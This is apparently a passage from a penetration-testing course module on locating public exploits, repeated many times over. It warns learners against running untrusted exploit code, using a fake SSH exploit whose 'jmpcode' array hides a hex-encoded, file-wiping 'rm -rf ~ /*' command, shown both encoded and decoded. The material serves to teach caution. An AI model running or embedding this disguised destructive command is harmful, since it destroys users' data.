Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

